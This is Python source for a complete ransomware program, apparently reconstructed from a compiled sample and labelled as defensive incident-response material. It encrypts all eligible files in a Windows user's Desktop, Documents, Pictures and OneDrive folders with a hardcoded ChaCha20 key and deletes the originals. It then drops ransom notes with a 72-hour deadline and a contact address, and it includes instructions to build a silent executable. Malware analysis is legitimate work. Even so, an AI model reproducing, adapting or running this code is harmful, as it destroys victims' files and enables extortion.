#!/usr/bin/env python3
"""
ransom.py - Standalone ransomware with hardcoded encryption key.

Compile to .exe:  pyinstaller --onefile --noconsole ransom.py
Then just run the .exe — it does everything automatically.

Features:
    - Hardcoded ChaCha20 encryption key (change ENCRYPTION_KEY below)
    - Auto-scans common user directories on execution
    - Skips executables, system files, already-encrypted files, and its own note
    - Drops HOW_TO_DECRYPT.txt ransom notes in every directory
    - Logs activity to %APPDATA%\\ransom.log

---
Reconstructed from ransom.pyc (Python 3.12 / PyInstaller) via pycdc + dis.
Defensive / IR analysis only — do not execute against live data.
"""

import os
import sys
import base64
import logging
from pathlib import Path

try:
    from Crypto.Cipher import ChaCha20
except ImportError:
    print("Missing dependency. Install with: pip install pycryptodome")
    sys.exit(1)

# Lab / fixed variant: ChaCha20 needs exactly 32 bytes.
# Sample literal is 44 B (broken); here we use original[:32].
# ENCRYPTION_KEY = b"X7k9mP2vQ8wR4tY6uI0oA3sD5fG7hJ1lZxCvBnMqWeRs"  # 44 B — fails
# ENCRYPTION_KEY = bytes.fromhex(
#     "8a3f02d97c41e65b09fd27b35e8814ca"
#     "44601d9a73cf5208e1ab367bd04529fc"
# )  # alternate random 32 B test key
ENCRYPTION_KEY = bytes.fromhex(
    "58376b396d50327651387752347459367549306f4133734435664737684a316c"
)  # 32 B == b"X7k9mP2vQ8wR4tY6uI0oA3sD5fG7hJ1l"
FILE_EXTENSION = ".locked"
RANSOM_NOTE_NAME = "HOW_TO_DECRYPT.txt"
LOG_FILE = os.path.join(os.getenv("APPDATA", ""), "ransom.log")

SCAN_DIRS = [
    "Desktop",
    "Documents",
    "Downloads",
    "Pictures",
    "Music",
    "Videos",
    "OneDrive\\Desktop",
    "OneDrive\\Documents",
    "OneDrive\\Pictures",
]

SKIP_NAMES = {RANSOM_NOTE_NAME}
SKIP_SUFFIXES = {".dll", ".exe", ".log", ".pyc", ".sys", ".locked"}

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s %(message)s",
)


def encrypt_file(file_path: Path) -> None:
    """Encrypt a single file in-place and rename it with FILE_EXTENSION."""
    cipher = ChaCha20.new(key=ENCRYPTION_KEY)
    with open(file_path, "rb") as f_in:
        plaintext = f_in.read()
    ciphertext = cipher.encrypt(plaintext)
    # photo.jpg -> photo.jpg.locked  (suffix + .locked)
    new_path = file_path.with_suffix(file_path.suffix + FILE_EXTENSION)
    with open(new_path, "wb") as f_out:
        f_out.write(cipher.nonce + ciphertext)
    os.remove(file_path)


def decrypt_file(file_path: Path) -> None:
    """Decrypt a file encrypted by this script (present in binary; never called from __main__)."""
    with open(file_path, "rb") as f_in:
        nonce = f_in.read(8)
        ciphertext = f_in.read()
    cipher = ChaCha20.new(key=ENCRYPTION_KEY, nonce=nonce)
    plaintext = cipher.decrypt(ciphertext)
    if file_path.name.endswith(FILE_EXTENSION):
        new_name = file_path.name[: -len(FILE_EXTENSION)]
        new_path = file_path.parent / new_name
    else:
        new_path = file_path.with_suffix("")
    with open(new_path, "wb") as f_out:
        f_out.write(plaintext)
    os.remove(file_path)


def collect_files(target_dir: Path) -> list[Path]:
    """Collect eligible files under *target_dir*."""
    if hasattr(sys, "frozen"):
        ransom_exe = Path(sys.executable).resolve()
    else:
        ransom_exe = Path(__file__).resolve()

    files: list[Path] = []
    for root, dirs, filenames in os.walk(target_dir):
        # skip hidden directories (names starting with '.')
        dirs[:] = [d for d in dirs if not d.startswith(".")]
        for name in filenames:
            fp = Path(root) / name
            if name in SKIP_NAMES:
                continue
            if any(name.endswith(s) for s in SKIP_SUFFIXES):
                continue
            if fp.resolve() == ransom_exe:
                continue
            files.append(fp)
    return files


def write_ransom_notes(target_dir: Path) -> None:
    """Drop a HOW_TO_DECRYPT.txt in every directory under *target_dir*."""
    key_b64 = base64.b64encode(ENCRYPTION_KEY).decode()
    note_content = f"""
============================================
       YOUR FILES HAVE BEEN ENCRYPTED!
============================================

All files in this directory (and subdirectories) have been encrypted.

To decrypt your files you need the encryption key:

    {key_b64}

If you deleted or lost the key, your files are gone forever.
You have 72 hours — after that the key will be destroyed!

Contact: decrypt@ransomware.example.com
============================================
"""
    for root, dirs, _files in os.walk(target_dir):
        note_path = Path(root) / RANSOM_NOTE_NAME
        if note_path.exists():
            continue
        note_path.write_text(note_content)


def run_ransom() -> None:
    """Encrypt files in all configured directories."""
    home = Path.home()
    for rel_dir in SCAN_DIRS:
        target = home / rel_dir
        if not target.is_dir():
            continue
        logging.info(f"Scanning {target}")
        files = collect_files(target)
        for fp in sorted(files):
            try:
                encrypt_file(fp)
                logging.info(f"[ENCRYPTED] {fp}")
            except Exception as e:
                logging.error(f"[ERROR   ] {fp}: {e}")
        write_ransom_notes(target)
    logging.info("Done.")


if __name__ == "__main__":
    run_ransom()
